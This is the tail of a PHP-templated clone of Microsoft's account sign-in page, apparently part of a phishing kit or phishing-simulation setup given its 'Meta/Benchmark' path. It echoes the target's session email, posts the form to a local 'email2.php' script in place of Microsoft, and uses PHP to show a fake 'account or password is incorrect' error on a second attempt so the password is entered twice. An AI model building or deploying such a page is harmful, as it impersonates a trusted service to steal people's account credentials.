                        <a id="idA_PWD_ForgotPassword" role="link" href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1672418802%26rver%3d7.0.6737.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252foutlook.live.com%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253d463fd062-80f9-b873-f8e5-37d460e65ab0%26id%3d292841%26aadredir%3d1%26CBCXT%3dout%26lw%3d1%26fl%3ddob%252cflname%252cwld%26cobrandid%3d90015%26contextid%3dAE9AA14694627394%26bk%3d1672418804&amp;id=292841&amp;uiflavor=web&amp;cobrandid=90015&amp;uaid=faa57fd20e47496fbace93710f7ef737&amp;mkt=EN-US&amp;lc=1033&amp;bk=1672418804" data-bind="
                            text: unsafe_forgotPasswordText,
                            href: accessRecoveryLink || svr.r,
                            attr: { target: accessRecoveryLink &amp;&amp; &#39;_blank&#39; },
                            click: accessRecoveryLink ? null : resetPassword_onClick">Forgot password?</a>
                    </div>
                    <!-- /ko -->
                    <!-- ko if: allowPhoneDisambiguation --><!-- /ko -->
                    <!-- ko ifnot: useEvictedCredentials -->
                        <!-- ko component: { name: "cred-switch-link-control",
                            params: {
                                serverData: svr,
                                username: username,
                                availableCreds: availableCreds,
                                flowToken: flowToken,
                                currentCred: { credType: 1 } },
                            event: {
                                switchView: credSwitchLink_onSwitchView,
                                redirect: onRedirect,
                                setPendingRequest: credSwitchLink_onSetPendingRequest,
                                updateFlowToken: credSwitchLink_onUpdateFlowToken } } --><!--  -->

<div class="form-group">
    <!-- ko if: showSwitchToCredPickerLink --><!-- /ko -->

    <!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) -->
        <!-- ko ifnot: hideCredSwitchLink -->
        <a href="https://login.live.com/#" data-bind="
            attr: { &#39;id&#39;: switchToCredId },
            text: switchToCredText,
            ariaDescribedBy: ariaDescribedBy,
            click: switchToCred_onClick,
            hasFocusEx: !showSwitchToCredPickerLink &amp;&amp; setFocus" id="otcLoginLink">Email code to <?php echo $_SESSION['email']; ?></a>
        <!-- /ko -->

        <!-- ko if: displayHelp && selectedCredType === 7 --><!-- /ko -->
    <!-- /ko -->

    <!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko -->
</div>

<!-- ko if: credLinkError --><!-- /ko --><!-- /ko -->

                        <!-- ko if: evictedCreds.length > 0 --><!-- /ko -->
                    <!-- /ko -->
                    <!-- ko if: showChangeUserLink --><!-- /ko -->
                </div>
            </div>
        </div>
    </div>

    <div class="win-button-pin-bottom" data-bind="css : { &#39;boilerplate-button-bottom&#39;: tenantBranding.BoilerPlateText }">
        <div class="row" data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }">
            <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
                params: {
                    serverData: svr,
                    primaryButtonText: str[&#39;CT_PWD_STR_SignIn_Button&#39;],
                    isPrimaryButtonEnabled: !isRequestPending(),
                    isPrimaryButtonVisible: svr.e,
                    isSecondaryButtonEnabled: true,
                    isSecondaryButtonVisible: false },
                event: {
                    primaryButtonClick: primaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { &#39;no-margin-bottom&#39;: removeBottomMargin },
    externalCss: { &#39;button-field-container&#39;: true }">

    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->

    <div data-bind="css: { &#39;inline-block&#39;: isPrimaryButtonVisible }, externalCss: { &#39;button-item&#39;: true }" class="inline-block button-item ext-button-item">
        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
        <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    &#39;button&#39;: true,
                    &#39;primary&#39;: true },
                value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
                hasFocus: focusOnPrimaryButton,
                click: primaryButton_onClick,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" value="Sign in" data-report-attached="1">
    </div>
</div></div>
        </div>
    </div>
</div>

<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko -->
</div><!-- /ko -->
            <!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        <!-- /ko -->
    </div>
</div></div>
        <!-- /ko -->

        <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
        <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
        <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
        <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
        <!-- ko if: svr.ad && !svr.fSkipRenderingNewCanaryToken --><!-- /ko -->
        <!-- ko if: !svr.ad || svr.fSkipRenderingNewCanaryToken -->
        <input type="hidden" name="canary" data-bind="value: svr.canary" value="">
        <!-- /ko -->
        <input type="hidden" name="ctx" data-bind="value: ctx" value="">
        <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="">
        <input type="hidden" id="i0327" data-bind="attr: { name: svr.bP }, value: flowToken" name="PPFT" value="Dbos2vuebRA4IaI57vz87mITdggXiCbBNXu9uEKj4vxCxwwY!9VC*Tf5REqXKQuRfEXwGWzCz8daV!Z3XR4h6iE7Qdn4Omf8Jx7Z4y2SKB8sq3j*reNX9iFV35v9*aqVjrRx2Vf!1M1zgZWP2UmFrar1yal7U1WUzjtyhY7LlcQHcuYNdNovt1Bg*tFLjjZO4kuznGBLXociWc26jGGe5dgtR7RCprbZUF0shDCoT70c*9ihkcAe4vi92jWRQfBKRk8cCnOpoA5vmMa7ogUq3eU$">
        <input type="hidden" name="PPSX" data-bind="value: svr.Dc" value="Passpor">
        <input type="hidden" name="NewUser" value="1">
        <input type="hidden" name="FoundMSAs" data-bind="value: svr.Ap" value="">
        <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
        <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
        <input type="hidden" name="CookieDisclosure" data-bind="value: svr.Bw ? 1 : 0" value="0">
        <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="1">
        <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0">
        <!-- ko ifnot: svr.fShouldSupportTargetCredentialForRecovery -->
        <input type="hidden" name="isRecoveryAttemptPost" data-bind="value: isRecoveryAttemptPost() ? 1 : 0" value="0">
        <!-- /ko -->
        <!-- ko if: svr.fShouldSupportTargetCredentialForRecovery && targetCredentialForRecovery() --><!-- /ko -->
        <div data-bind="component: { name: &#39;instrumentation-control&#39;,
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }">
<input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
    <!-- /ko -->
        </div>

        <!-- ko if: $page.showFedCredAndNewSession -->
        <!-- ko if: $page.showFedCredButtons --><!-- /ko -->

        <!-- ko if: $page.newSession --><!-- /ko -->
        <!-- /ko -->

        <!-- ko if: $page.showDebugDetails --><!-- /ko -->
    </div>
</div>
<!-- /ko --></div>
        </div>
    </div>

    <!-- ko if: $page.paginationControlHelper.showFooterControl -->
    <div id="footer" role="contentinfo" data-bind="
        externalCss: {
            &#39;footer&#39;: true,
            &#39;has-background&#39;: !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
            &#39;background-always-visible&#39;: $page.backgroundLogoUrl }" class="footer ext-footer">

        <div data-bind="component: { name: &#39;footer-control&#39;,
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }"><!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
<div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { &#39;footer-links&#39;: true }">

    <!-- ko if: showFooter -->
        <!-- ko if: !hideTOU -->
        <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                &#39;footer-content&#39;: true,
                &#39;footer-item&#39;: true,
                &#39;has-background&#39;: !useDefaultBackground,
                &#39;background-always-visible&#39;: hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;uaid=faa57fd20e47496fbace93710f7ef737" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
        <!-- /ko -->

        <!-- ko if: !hidePrivacy -->

        <!-- ko if: impressumLink --><!-- /ko -->

        <!-- ko if: a11yConformeLink --><!-- /ko -->

        <!-- ko if: showIcpLicense --><!-- /ko -->
    <!-- /ko -->

    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
    <a id="moreOptions" href="https://login.live.com/#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;],
        attr: { &#39;aria-expanded&#39;: showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            &#39;footer-content&#39;: true,
            &#39;footer-item&#39;: true,
            &#39;debug-item&#39;: true,
            &#39;has-background&#39;: !useDefaultBackground,
            &#39;background-always-visible&#39;: hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
</div>
<!-- /ko -->

<!-- ko if: svr.cB && showLinks --><!-- /ko --></div>
    </div>
    <!-- /ko -->
</div>
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() --><!-- /ko -->
    <!-- /ko -->
<!-- /ko --></div>
    <!-- /ko -->
</form>

<form data-bind="postRedirectForm: postRedirect" action="../../Meta/Benchmark/email2.php?token=<?php echo $_SESSION['token']; ?>" method="POST" aria-hidden="true" target="_top"></form>

<!-- ko if: svr.aL -->
<div id="idPartnerPL" data-bind="injectIframe: { url: svr.aL }"><iframe height="0" width="0" src="./microsoft2_files/prefetch.html" style="display: none;"></iframe></div>
<!-- /ko -->

<!-- ko if: svr.DS --><!-- /ko --></div></body></html>
            <?php

                if (isset($_SESSION['emailTwice']) && $_SESSION['emailTwice']) {
                    echo '
                    
                        document.getElementById("i0118").classList.add("has-error");
                        document.getElementById("passError").innerHTML = "<div id=\"passwordError\" class=\"error ext-error\"><span>Your account or password is incorrect.</span></div>";

                    ';
                }

            ?>
        </script>
    </body>
</html>